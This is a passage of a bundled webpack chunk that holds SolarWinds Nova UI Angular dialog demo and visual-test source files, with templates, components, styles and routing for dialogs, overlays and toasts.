<p>\n                    Fusce ut malesuada est. Ut ut placerat nunc. Vivamus mauris\n                    nisi, luctus nec turpis quis, luctus porta ante. Aliquam\n                    erat volutpat. Nulla facilisi. Maecenas id vehicula sem. Sed\n                    vitae sodales orci, sed pretium mauris. Maecenas orci est,\n                    volutpat sit amet elit in, gravida finibus justo. Vestibulum\n                    eget eros id risus elementum interdum eu quis nisi. Donec\n                    ullamcorper enim tincidunt, volutpat sem et, gravida sem.\n                    Fusce vitae tellus mauris. Nam non bibendum urna. Ut vel\n                    pellentesque est, quis egestas ex. Nam lobortis quam eget\n                    arcu tristique, id suscipit enim volutpat. Quisque pretium\n                    vel nisl eu aliquet.\n                </p>\n            </div>\n            <nui-dialog-footer>\n                <button\n                    (click)="onButtonClick(\'Cancel\')"\n                    nui-button\n                    type="button"\n                >\n                    Cancel\n                </button>\n                <button\n                    displayStyle="primary"\n                    (click)="onButtonClick(\'Action\')"\n                    nui-button\n                    type="button"\n                >\n                    Action\n                </button>\n            </nui-dialog-footer>\n        </ng-template>\n\n        <div>\n            <h3>Position on Screen</h3>\n            <button\n                id="nui-visual-test-long-dialog-btn"\n                (click)="\n                    openResponsive(contentResponsiveMode, {\n                        isResponsiveMode: false\n                    })\n                "\n            >\n                Default mode\n            </button>\n            <button\n                id="nui-visual-test-responsive-dialog-btn"\n                (click)="\n                    openResponsive(contentResponsiveMode, {\n                        isResponsiveMode: true\n                    })\n                "\n            >\n                Responsive mode\n            </button>\n            <hr />\n        </div>\n    </div>\n</div>\n'},40431:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, TemplateRef } from "@angular/core";\n\nimport { DialogService, NuiDialogRef } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-dialog-visual-test",\n    templateUrl: "./dialog-visual-test.component.html",\n})\nexport class DialogVisualTestComponent {\n    public severity: string;\n    private activeDialog: NuiDialogRef;\n    public isResponsiveMode = false;\n    public dataset = {\n        items: [\n            "Item 1",\n            "Item 2",\n            "Item 3",\n            "Item 4",\n            "Item 5",\n            "Item 6",\n            "Item 7",\n            "Item 8",\n            "Item 9",\n            "Item 10",\n            "Item 11",\n            "Item 12",\n            "Item 13",\n            "Item 14",\n            "Item 15",\n            "Item 16",\n            "Item 17",\n            "Item 18",\n            "Item 19",\n            "Item 20",\n        ],\n    };\n\n    constructor(@Inject(DialogService) private dialogService: DialogService) {}\n\n    public open(content: TemplateRef<string>, severity = ""): void {\n        this.severity = severity;\n        this.activeDialog = this.dialogService.open(content, { size: "sm" });\n    }\n\n    public openSizes(content: TemplateRef<string>, size: any): void {\n        this.activeDialog = this.dialogService.open(content, { size });\n    }\n\n    public openResponsive(content: TemplateRef<string>, options: any): void {\n        this.isResponsiveMode = options.isResponsiveMode;\n        this.activeDialog = this.dialogService.open(content);\n    }\n\n    public onButtonClick(): void {\n        this.activeDialog.close();\n    }\n\n    public confirmationDefaults(): void {\n        this.dialogService.confirm({\n            message: "Should I do it?",\n        });\n    }\n\n    public confirmationOverrides(): void {\n        this.dialogService.confirm({\n            message: "Are you sure you want to do it?",\n            title: "Format hard drive",\n            confirmText: "Format",\n            dismissText: "No!",\n            severity: "warning",\n        });\n    }\n}\n'},69059:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Basic Usage</h2>\n<nui-simple-dialog-example></nui-simple-dialog-example>\n\n<h2>Usage as a Component</h2>\n<nui-component-as-content-example></nui-component-as-content-example>\n\n<h2>Severity</h2>\n<nui-dialog-severity-example></nui-dialog-severity-example>\n\n<h2>Custom Dialog header</h2>\n<nui-header-buttons-example></nui-header-buttons-example>\n\n<h2>Dialog Sizes</h2>\n<nui-dialog-sizes-example></nui-dialog-sizes-example>\n\n<h2>Position on screen</h2>\n<nui-dialog-position-example></nui-dialog-position-example>\n\n<h2>Custom class</h2>\n<nui-dialog-custom-class-example></nui-dialog-custom-class-example>\n\n<h2>Confirmation Dialog</h2>\n<nui-confirmation-dialog-example></nui-confirmation-dialog-example>\n\n<h2>Keyboard Options</h2>\n<nui-dialog-with-keyboard-example></nui-dialog-with-keyboard-example>\n\n<h2>Static Backdrop</h2>\n<nui-dialog-with-static-backdrop-example></nui-dialog-with-static-backdrop-example>\n\n<h2>Z-Index Strategy</h2>\n<button\n    id="nui-visual-test-open-overlay-btn"\n    nui-button\n    type="button"\n    (click)="openOverlay(mainOverlayContent, \'60%\', \'400px\')"\n>\n    Open overlay\n</button>\n\n<ng-template #smallOverlayContent>\n    <div class="overlay-container">\n        <div class="overlay-body">\n            <ng-container *ngTemplateOutlet="loremIpsum"></ng-container>\n        </div>\n    </div>\n    <div class="overlay-footer">\n        <button\n            id="nui-visual-test-open-small-dialog-btn"\n            nui-button\n            type="button"\n            (click)="openInnerDialog(smallDialogContent)"\n        >\n            Open small Dialog\n        </button>\n        <button\n            id="nui-visual-test-close-overlay-from-small-btn"\n            nui-button\n            type="button"\n            (click)="closeOverlay()"\n        >\n            Close overlay\n        </button>\n    </div>\n</ng-template>\n<ng-template #mainOverlayContent>\n    <div class="overlay-container">\n        <div class="overlay-body">\n            <p>This is the content of an CDK overlay container.</p>\n            <ng-container\n                *ngTemplateOutlet="\n                    tooltip;\n                    context: { text: \'Main overlay tooltip\' }\n                "\n            ></ng-container>\n            <ng-container\n                *ngTemplateOutlet="timeframeBarTemplate"\n            ></ng-container>\n            <ng-container *ngTemplateOutlet="menu"></ng-container>\n            <ng-container *ngTemplateOutlet="popup"></ng-container>\n            <ng-container *ngTemplateOutlet="select"></ng-container>\n            <ng-container *ngTemplateOutlet="combobox"></ng-container>\n            <ng-container *ngTemplateOutlet="popover"></ng-container>\n            <ng-container *ngTemplateOutlet="dtPicker"></ng-container>\n            <ng-container *ngTemplateOutlet="spinner"></ng-container>\n            <ng-container\n                *ngTemplateOutlet="\n                    busyTemplate;\n                    context: { text: \'Inner overlay tooltip\' }\n                "\n            ></ng-container>\n        </div>\n    </div>\n    <div class="overlay-footer">\n        <button nui-button type="button" (click)="showToast()">\n            Show toast\n        </button>\n        <button\n            id="nui-visual-test-switch-appendToBody-btn"\n            nui-button\n            type="button"\n            (click)="toggleAppendToBody()"\n            i18n\n        >\n            appendToBody={{ appendToBody }}\n        </button>\n        <button\n            id="nui-visual-test-switch-busy-btn"\n            nui-button\n            type="button"\n            (click)="toggleBusy()"\n            i18n\n        >\n            busy={{ busy }}\n        </button>\n        <button\n            id="nui-visual-test-inner-dialog-btn"\n            nui-button\n            type="button"\n            (click)="openInnerDialog(innerDialogContent)"\n        >\n            Open Inner Dialog\n        </button>\n        <button nui-button type="button" (click)="closeOverlay()">\n            Close overlay\n        </button>\n    </div>\n</ng-template>\n\n<ng-template #smallDialogContent let-close="close" let-dismiss="dismiss">\n    <nui-dialog-header\n        title="Small Dialog Title"\n        (closed)="close()"\n    ></nui-dialog-header>\n    <div class="dialog-body">\n        <ng-container *ngTemplateOutlet="loremIpsum"></ng-container>\n    </div>\n    <nui-dialog-footer>\n        <button\n            id="nui-visual-test-close-small-dialog-btn"\n            nui-button\n            type="button"\n            (click)="close()"\n        >\n            Close\n        </button>\n    </nui-dialog-footer>\n</ng-template>\n\n<ng-template #innerDialogContent let-close="close" let-dismiss="dismiss">\n    <nui-dialog-header\n        title="Inner Dialog Title"\n        (closed)="close()"\n    ></nui-dialog-header>\n    <div class="dialog-body">\n        <p>This is the content of a dialog.</p>\n        <ng-container\n            *ngTemplateOutlet="\n                tooltip;\n                context: { text: \'Inner dialog tooltip\' }\n            "\n        ></ng-container>\n        <ng-container *ngTemplateOutlet="timeframeBarTemplate"></ng-container>\n        <ng-container *ngTemplateOutlet="menu"></ng-container>\n        <ng-container *ngTemplateOutlet="popup"></ng-container>\n        <ng-container *ngTemplateOutlet="select"></ng-container>\n        <ng-container *ngTemplateOutlet="combobox"></ng-container>\n        <ng-container *ngTemplateOutlet="popover"></ng-container>\n        <ng-container *ngTemplateOutlet="dtPicker"></ng-container>\n        <ng-container *ngTemplateOutlet="spinner"></ng-container>\n        <ng-container\n            *ngTemplateOutlet="\n                busyTemplate;\n                context: { text: \'Inner dialog tooltip\' }\n            "\n        ></ng-container>\n    </div>\n    <nui-dialog-footer>\n        <button\n            id="nui-visual-test-open-overlay-from-dialog-btn"\n            nui-button\n            type="button"\n            (click)="openOverlay(smallOverlayContent, \'40%\', \'200px\')"\n        >\n            +Overlay\n        </button>\n        <button\n            id="nui-visual-test-open-small-dialog-from-dialog-btn"\n            nui-button\n            type="button"\n            (click)="openInnerDialog(smallDialogContent)"\n        >\n            +Dialog\n        </button>\n        <button nui-button type="button" (click)="toggleBusy()" i18n>\n            Switch busy\n        </button>\n        <button nui-button type="button" (click)="showToast()">\n            Show toast\n        </button>\n        <button nui-button type="button" (click)="closeDialog(); close()">\n            Close\n        </button>\n    </nui-dialog-footer>\n</ng-template>\n\n<ng-template #menu>\n    <nui-menu\n        [appendToBody]="appendToBody"\n        title="Menu"\n        class="clickable-visual-item"\n    >\n        <nui-menu-action *ngFor="let item of items">{{ item }}</nui-menu-action>\n    </nui-menu>\n</ng-template>\n\n<ng-template #popup>\n    <nui-popup [appendToBody]="appendToBody" class="clickable-visual-item">\n        <button\n            nui-button\n            nuiPopupToggle\n            type="button"\n            icon="caret-down"\n            [iconRight]="true"\n            class="menu-button"\n            [isEmpty]="false"\n            i18n\n        >\n            Popup\n        </button>\n        <div popupAreaContent>\n            <ng-container *ngFor="let item of items">\n                <nui-menu-item\n                    tabindex="0"\n                    nuiTooltip="This tooltip is part of a menu item"\n                    >{{ item }}</nui-menu-item\n                >\n            </ng-container>\n        </div>\n    </nui-popup>\n</ng-template>\n\n<ng-template #select>\n    \x3c!-- select v1 --\x3e\n    <nui-select\n        class="clickable-visual-item"\n        [itemsSource]="items"\n        [inline]="true"\n        [appendToBody]="appendToBody"\n        placeholder="Select v1"\n    ></nui-select>\n\n    \x3c!-- select v2 --\x3e\n    <nui-select-v2\n        class="clickable-visual-item d-inline-flex"\n        placeholder="Select v2"\n    >\n        <ng-container *ngFor="let item of items">\n            <nui-select-v2-option [value]="item" i18n>{{\n                item\n            }}</nui-select-v2-option>\n        </ng-container>\n    </nui-select-v2>\n</ng-template>\n\n<ng-template #combobox>\n    <nui-combobox\n        class="clickable-visual-item"\n        [itemsSource]="items"\n        [inline]="true"\n        [appendToBody]="appendToBody"\n        i18n-placeholder\n        placeholder="Combobox v1"\n    ></nui-combobox>\n\n    <nui-combobox-v2\n        class="clickable-visual-item d-inline-flex"\n        placeholder="Combobox v2"\n    >\n        <ng-container *ngFor="let item of items">\n            <nui-select-v2-option [value]="item">\n                <div class="d-flex align-items-center">\n                    <span [nuiComboboxV2OptionHighlight]="item"></span>\n                </div>\n            </nui-select-v2-option>\n        </ng-container>\n    </nui-combobox-v2>\n</ng-template>\n\n<ng-template #spinner>\n    <nui-spinner\n        size="large"\n        [show]="true"\n        message="Spinner"\n        i18n-message\n        helpText="Optional spinner description"\n        i18n-helpText\n    >\n    </nui-spinner>\n</ng-template>\n\n<ng-template #busyTemplate let-text="text">\n    <div nui-busy [busy]="busy" class="busy-content">\n        We used focus trigger so that the popover with a\n        <span\n            nuiTooltip="{{ text }} {{ longTextTooltip }}"\n            tooltipPlacement="bottom"\n            class="nui-text-widget--hoverable"\n        >\n            big tooltip\n        </span>\n        will remain open even after we move the mouse away from it even.\n    </div>\n</ng-template>\n\n<ng-template #dtPicker>\n    <div class="inline-flex">\n        <nui-date-time-picker\n            class="clickable-visual-item"\n            [appendToBody]="appendToBody"\n            [model]="dt"\n            displayMode="inline"\n        >\n        </nui-date-time-picker>\n    </div>\n</ng-template>\n\n<ng-template #timeframeBarTemplate>\n    <nui-time-frame-bar [(timeFrame)]="timeFrame">\n        \x3c!-- content for default projection slot --\x3e\n        <nui-icon icon="calendar" class="pr-3"></nui-icon>\n        {{ timeFrame | timeFrame }}\n\n        \x3c!-- content for time frame selection projection slot --\x3e\n        <nui-quick-picker timeFrameSelection>\n            <nui-time-frame-picker></nui-time-frame-picker>\n        </nui-quick-picker>\n    </nui-time-frame-bar>\n</ng-template>\n\n<ng-template #popover>\n    I\'m a\n    <nui-popover\n        tabindex="1"\n        class="clickable-visual-item"\n        trigger="focus"\n        [template]="popoverWithBasicUsage"\n    >\n        <span class="nui-text-widget--hoverable">popover</span>\n    </nui-popover>\n    with Focus Trigger\n    <ng-template #popoverWithBasicUsage>\n        <span>I\'m a popover with some content with a</span>&nbsp;\n        <span\n            nuiTooltip="Tooltip inside popover {{ longTextTooltip }}"\n            class="nui-text-widget--hoverable"\n            >tooltip</span\n        >\n        &nbsp;inside.\n        <ng-container *ngTemplateOutlet="loremIpsum"></ng-container>\n    </ng-template>\n</ng-template>\n\n<ng-template #tooltip let-text="text">\n    <span\n        id="long-text-tooltip"\n        nuiTooltip="Tooltip should appear on top of any other components (popup, popover, menu,etc.) even if it\'s displayed after the popover has been displayed."\n        tooltipPlacement="bottom"\n        class="nui-text-widget--hoverable"\n        >I\'m a long text tooltip!\n    </span>\n</ng-template>\n\n<ng-template #loremIpsum>\n    <p>\n        Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam maximus\n        faucibus bibendum. Aenean feugiat interdum leo sed posuere. Etiam at\n        pulvinar enim, nec interdum purus. Pellentesque sit amet semper ipsum,\n        eu vulputate tortor. Aliquam vitae nisi augue. Duis non erat sit amet\n        sem venenatis accumsan at ullamcorper lorem. Morbi non turpis nibh.\n    </p>\n</ng-template>\n'},57991:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n\n.main-overlay-panel {\n    padding: @nui-space-sm;\n    background: @nui-color-bg-content;\n\n    .overlay-footer {\n        display: flex;\n        justify-content: flex-end;\n        padding: @nui-space-sm;\n        button {\n            margin-left: 15px;\n        }\n    }\n}\n\n.busy-content {\n    border: 1px @nui-color-line-default solid;\n    padding: @nui-space-sm;\n}\n\n.inline-flex {\n    display: inline-flex;\n}\n'},15739:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Overlay, OverlayRef } from "@angular/cdk/overlay";\nimport { TemplatePortal } from "@angular/cdk/portal";\nimport {\n    Component,\n    OnInit,\n    TemplateRef,\n    ViewContainerRef,\n    ViewEncapsulation,\n} from "@angular/core";\nimport moment from "moment/moment";\n\nimport {\n    DialogService,\n    ITimeframe,\n    NuiDialogRef,\n    ToastService,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-dialog-zindex--test",\n    templateUrl: "./dialog-zindex-test.component.html",\n    styleUrls: ["./dialog-zindex-test.component.less"],\n    encapsulation: ViewEncapsulation.None,\n})\nexport class DialogZIndexTestComponent implements OnInit {\n    public busy: boolean = false;\n    public appendToBody: boolean = false;\n\n    public timeFrame: ITimeframe;\n\n    public dt = moment("2018-02-02");\n    public items = [\n        "Long description item 1",\n        "Item 2",\n        "Item 3",\n        "Item 4",\n        "Item 5",\n        "Item 6",\n    ];\n    public longTextTooltip = `\n    which should appear on top of any other components (popup, popover, menu,etc.) even if it\'s displayed after the popover has been displayed.\n    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam maximus faucibus bibendum.\n    Aenean feugiat interdum leo sed posuere. Etiam at pulvinar enim, nec interdum purus.\n    Pellentesque sit amet semper ipsum, eu vulputate tortor. Aliquam vitae nisi augue.\n    Duis non erat sit amet sem venenatis accumsan at ullamcorper lorem. Morbi non turpis nibh.\n    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam maximus faucibus bibendum.\n    Duis non erat sit amet sem venenatis accumsan at ullamcorper lorem. Morbi non turpis nibh.\n    `;\n\n    private activeDialogs: NuiDialogRef[] = [];\n    private overlayRef: OverlayRef;\n    private baseDate = moment([2018, 5, 1, 15, 0, 0]);\n\n    constructor(\n        private dialogService: DialogService,\n        private toastService: ToastService,\n        private overlay: Overlay,\n        private viewContainerRef: ViewContainerRef\n    ) {}\n\n    public ngOnInit(): void {\n        this.timeFrame = {\n            startDatetime: this.baseDate.clone().subtract(1, "weeks"),\n            endDatetime: this.baseDate.clone(),\n        };\n    }\n\n    public toggleBusy(): void {\n        this.busy = !this.busy;\n    }\n\n    public toggleAppendToBody(): void {\n        this.appendToBody = !this.appendToBody;\n    }\n\n    public openOverlay(\n        templateRef: TemplateRef<string>,\n        width: string,\n        height: string\n    ): void {\n        const positionStrategy = this.overlay\n            .position()\n            .global()\n            .centerHorizontally()\n            .centerVertically();\n\n        this.overlayRef = this.overlay.create({\n            positionStrategy,\n            hasBackdrop: true,\n            panelClass: ["main-overlay-panel", "d-flex", "flex-column"],\n            width: width,\n            height: height,\n            scrollStrategy: this.overlay.scrollStrategies.block(),\n        });\n        const portal = new TemplatePortal(templateRef, this.viewContainerRef);\n        this.overlayRef.attach(portal);\n    }\n\n    public closeOverlay(): void {\n        this.overlayRef.detach();\n    }\n\n    public openInnerDialog(templateRef: TemplateRef<string>): void {\n        this.activeDialogs.push(\n            this.dialogService.open(templateRef, {\n                windowClass: "inner-dialog",\n            })\n        );\n    }\n\n    public closeDialog(): void {\n        this.activeDialogs.pop()?.close();\n    }\n\n    public showToast(): void {\n        this.toastService.success({\n            message: $localize`Sample toast displayed!`,\n            title: $localize`Event`,\n        });\n    }\n}\n'},52441:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiBusyModule,\n    NuiButtonModule,\n    NuiDateTimePickerModule,\n    NuiDialogModule,\n    NuiDocsModule,\n    NuiIconModule,\n    NuiMenuModule,\n    NuiMessageModule,\n    NuiPopoverModule,\n    NuiPopupModule,\n    NuiSelectModule,\n    NuiSelectV2Module,\n    NuiSpinnerModule,\n    NuiTimeFrameBarModule,\n    NuiTimeFramePickerModule,\n    NuiTooltipModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    ComponentAsContentExampleComponent,\n    ConfirmationDialogExampleComponent,\n    DialogActionBeforeClosureExampleComponent,\n    DialogAfterOpenedExampleComponent,\n    DialogContentExampleComponent,\n    DialogCustomClassExampleComponent,\n    DialogDocsComponent,\n    DialogInsideOverlayExampleComponent,\n    DialogInsideOverlayWithDateTimePickerExampleComponent,\n    DialogPositionExampleComponent,\n    DialogSeverityExampleComponent,\n    DialogSizesExampleComponent,\n    DialogTestComponent,\n    DialogVisualTestComponent,\n    DialogWithKeyboardExampleComponent,\n    DialogWithStaticBackdropExampleComponent,\n    DialogZIndexTestComponent,\n    HeaderButtonsExampleComponent,\n    SimpleDialogExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: DialogDocsComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "dialog-test",\n        component: DialogTestComponent,\n        data: {\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "zindex-test",\n        component: DialogZIndexTestComponent,\n    },\n    {\n        path: "dialog-overlay",\n        component: DialogVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "dialog-actions-before-closure",\n        component: DialogActionBeforeClosureExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "dialog-visual-test",\n        component: DialogVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiDialogModule,\n        NuiDocsModule,\n        NuiButtonModule,\n        NuiMessageModule,\n        NuiSelectV2Module,\n        RouterModule.forChild(routes),\n        NuiSelectModule,\n        NuiDialogModule,\n        NuiDocsModule,\n        NuiButtonModule,\n        NuiMessageModule,\n        NuiSelectModule,\n        NuiPopoverModule,\n        NuiTooltipModule,\n        NuiDateTimePickerModule,\n        NuiBusyModule,\n        NuiSpinnerModule,\n        NuiSelectV2Module,\n        NuiMenuModule,\n        NuiPopupModule,\n        NuiTimeFrameBarModule,\n        NuiTimeFramePickerModule,\n        NuiIconModule,\n    ],\n    declarations: [\n        DialogContentExampleComponent,\n        ComponentAsContentExampleComponent,\n        ConfirmationDialogExampleComponent,\n        DialogCustomClassExampleComponent,\n        DialogDocsComponent,\n        DialogTestComponent,\n        DialogWithKeyboardExampleComponent,\n        DialogPositionExampleComponent,\n        DialogSeverityExampleComponent,\n        DialogSizesExampleComponent,\n        DialogInsideOverlayExampleComponent,\n        DialogVisualTestComponent,\n        HeaderButtonsExampleComponent,\n        SimpleDialogExampleComponent,\n        DialogWithStaticBackdropExampleComponent,\n        DialogZIndexTestComponent,\n        DialogInsideOverlayWithDateTimePickerExampleComponent,\n        DialogActionBeforeClosureExampleComponent,\n        DialogAfterOpenedExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("dialog"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class DialogModule {}\n'},35145:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #headerButtonsContent let-close="close">\n    <nui-dialog-header title="Dialog title" i18n-title (closed)="close()">\n        <button\n            nui-button\n            type="button"\n            displayStyle="action"\n            icon="fullscreen"\n        ></button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="action"\n            icon="menu"\n        ></button>\n    </nui-dialog-header>\n    <div class="dialog-body">\n        <p i18n>\n            Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam\n            maximus faucibus bibendum. Aenean feugiat interdum leo sed posuere.\n            Etiam at pulvinar enim, nec interdum purus. Duis elit metus,\n            lobortis vitae quam a, malesuada cursus quam. Duis vel lacinia\n            purus. Maecenas eget arcu ac ante sagittis eleifend vel ut purus.\n            Pellentesque sit amet semper ipsum, eu vulputate tortor. Aliquam\n            vitae nisi augue. Duis non erat sit amet sem venenatis accumsan at\n            ullamcorper lorem. Morbi non turpis nibh.\n        </p>\n    </div>\n    <nui-dialog-footer>\n        <button nui-button type="button" (click)="onButtonClick(\'Cancel\')" i18n>\n            Cancel\n        </button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="primary"\n            (click)="onButtonClick(\'Action\')"\n            i18n\n        >\n            Action\n        </button>\n    </nui-dialog-footer>\n</ng-template>\n\n<button\n    id="nui-demo-custom-actions"\n    nui-button\n    type="button"\n    (click)="open(headerButtonsContent)"\n    i18n\n>\n    More actions\n</button>\n'},1733:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, TemplateRef } from "@angular/core";\n\nimport { DialogService, NuiDialogRef, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-header-buttons-example",\n    templateUrl: "./header-buttons.example.component.html",\n})\nexport class HeaderButtonsExampleComponent {\n    private activeDialog: NuiDialogRef;\n\n    constructor(\n        @Inject(DialogService) private dialogService: DialogService,\n        @Inject(ToastService) private toastService: ToastService\n    ) {}\n\n    public open(content: TemplateRef<string>): void {\n        this.activeDialog = this.dialogService.open(content, { size: "sm" });\n    }\n\n    public onButtonClick(title: string): void {\n        title === "Action" ? this.actionDone() : this.actionCanceled();\n        this.activeDialog.close();\n    }\n\n    private actionDone(): void {\n        this.toastService.success({\n            message: $localize`Action Done!`,\n            title: $localize`Event`,\n        });\n    }\n\n    private actionCanceled(): void {\n        this.toastService.info({\n            message: $localize`Action Cancelled!`,\n            title: $localize`Event`,\n        });\n    }\n}\n'},38731:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./dialog-docs/dialog-docs.example.component";\nexport * from "./simple-dialog/simple-dialog.example.component";\nexport * from "./component-as-content/component-as-content.example.component";\nexport * from "./component-as-content/dialog-content.example.component";\nexport * from "./dialog-severity/dialog-severity.example.component";\nexport * from "./dialog-sizes/dialog-sizes.example.component";\nexport * from "./dialog-position/dialog-position.example.component";\nexport * from "./header-buttons/header-buttons.example.component";\nexport * from 